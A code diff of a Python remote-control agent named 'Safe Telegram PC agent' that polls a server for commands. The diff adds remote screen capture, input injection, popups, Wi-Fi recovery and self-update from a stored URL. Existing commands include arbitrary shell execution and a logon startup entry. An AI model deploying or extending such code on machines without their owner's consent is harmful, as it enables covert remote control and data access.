+def handle_command(command: dict[str, Any], snapshot: dict[str, Any], session: requests.Session) -> dict[str, Any]:
     command_type = command["type"]
     args = command.get("args", {})
 
@@ -937,10 +1671,15 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
             "data": {"uptime_seconds": snapshot["uptime_seconds"]},
         }
     if command_type == "net":
+        wifi_profile = snapshot.get("wifi_profile") or "н/д"
+        wifi_signal = snapshot.get("wifi_signal")
+        wifi_suffix = f" ({wifi_signal}%)" if wifi_signal is not None else ""
         return {
             "ok": True,
             "message": (
                 f"IP: {', '.join(snapshot['ip_addresses']) or 'н/д'}\n"
+                f"Wi-Fi: {wifi_profile}{wifi_suffix}\n"
+                f"Интернет: {'ok' if snapshot.get('internet_ok') else 'нет'}\n"
                 f"Скачивание: {human_bytes(snapshot['net_down_per_sec'])}/с\n"
                 f"Отдача: {human_bytes(snapshot['net_up_per_sec'])}/с"
             ),
@@ -948,6 +1687,9 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
                 "ip_addresses": snapshot["ip_addresses"],
                 "net_down_per_sec": snapshot["net_down_per_sec"],
                 "net_up_per_sec": snapshot["net_up_per_sec"],
+                "wifi_profile": snapshot.get("wifi_profile"),
+                "wifi_signal": snapshot.get("wifi_signal"),
+                "internet_ok": snapshot.get("internet_ok"),
             },
         }
     if command_type == "drives":
@@ -969,6 +1711,17 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
             "file_name": file_name,
             "file_b64": file_b64,
         }
+    if command_type == "remote_frame":
+        file_name, file_b64, frame_data = remote_frame_data()
+        return {
+            "ok": True,
+            "message": "Удалённый кадр получен.",
+            "data": frame_data,
+            "file_name": file_name,
+            "file_b64": file_b64,
+        }
+    if command_type == "remote_input":
+        return perform_remote_input(args)
     if command_type == "shell_cmd":
         command_text = str(args.get("command", "")).strip()
         return run_shell_command(command_text)
@@ -993,6 +1746,12 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
         return {"ok": True, "message": restart_pc(), "data": {}}
     if command_type == "shutdown_pc":
         return {"ok": True, "message": shutdown_pc(), "data": {}}
+    if command_type == "show_text":
+        return show_text_popup(str(args.get("text", "")))
+    if command_type == "wifi_recover":
+        return attempt_wifi_recovery()
+    if command_type == "self_update":
+        return perform_self_update(session)
     if command_type == "uninstall_self":
         return uninstall_self()
     raise ValueError(f"Неподдерживаемая команда: {command_type}")
@@ -1001,11 +1760,13 @@ def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[st
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Safe Telegram PC agent")
     parser.add_argument("--set-name", help="Override the display name used on the server")
+    parser.add_argument("--set-update-url", help="Persist the URL used for self-updates")
     parser.add_argument(
         "--install-startup",
         action="store_true",
         help="Create a per-user startup entry for logon startup",
     )
+    parser.add_argument("--show-text-b64", help="Internal: show a text popup without console")
     return parser.parse_args()
 
 
@@ -1014,6 +1775,8 @@ def run_loop() -> None:
     previous_net: dict[str, Any] | None = None
     cached_snapshot: dict[str, Any] | None = None
     last_heartbeat = 0.0
+    last_wifi_recovery_at = 0.0
+    consecutive_network_failures = 0
 
     while True:
         try:
@@ -1023,13 +1786,18 @@ def run_loop() -> None:
                 cached_snapshot, previous_net = collect_snapshot(previous_net)
                 heartbeat(session, state, cached_snapshot)
                 last_heartbeat = now
+                consecutive_network_failures = 0
+                if not cached_snapshot.get("internet_ok"):
+                    last_wifi_recovery_at, note = maybe_recover_wifi(last_wifi_recovery_at, "heartbeat-no-internet")
+                    if note:
+                        print(f"[agent] {note}")
 
             command = fetch_command(session, state)
             if command:
                 if cached_snapshot is None:
                     cached_snapshot, previous_net = collect_snapshot(previous_net)
                 try:
-                    result = handle_command(command, cached_snapshot)
+                    result = handle_command(command, cached_snapshot, session)
                 except Exception as exc:
                     post_result(
                         session,
@@ -1050,18 +1818,35 @@ def run_loop() -> None:
                         file_name=result.get("file_name"),
                         file_b64=result.get("file_b64"),
                     )
+                    if result.get("restart_after_result"):
+                        restart_self()
+                        return
                     if result.get("shutdown_after_result"):
                         return
             time.sleep(COMMAND_POLL_SECONDS)
         except KeyboardInterrupt:
             raise
         except Exception as exc:
+            consecutive_network_failures += 1
+            if not network_reachable(timeout=1.0):
+                last_wifi_recovery_at, note = maybe_recover_wifi(
+                    last_wifi_recovery_at,
+                    f"loop-exception-{type(exc).__name__}",
+                    force=consecutive_network_failures >= 2,
+                )
+                if note:
+                    print(f"[agent] {note}")
             print(f"[agent] {exc}")
             time.sleep(5)
 
 
 def main() -> None:
     args = parse_args()
+
+    if args.show_text_b64:
+        render_popup_window(decode_popup_text(args.show_text_b64))
+        return
+
     state = load_state()
     changed_state = False
 
@@ -1069,12 +1854,21 @@ def main() -> None:
         state["display_name"] = args.set_name
         if "device_id" not in state:
             state["device_id"] = stable_device_id()
-        save_state(state)
         changed_state = True
         print(f"Имя устройства изменено на: {args.set_name}")
 
+    if args.set_update_url:
+        state["update_url"] = args.set_update_url.strip()
+        changed_state = True
+        print("URL обновления сохранён.")
+
+    if changed_state:
+        save_state(state)
+        update_install_summary()
+
     if args.install_startup:
         install_startup_task()
+        update_install_summary()
         print("Автозапуск установлен.")
         return
 
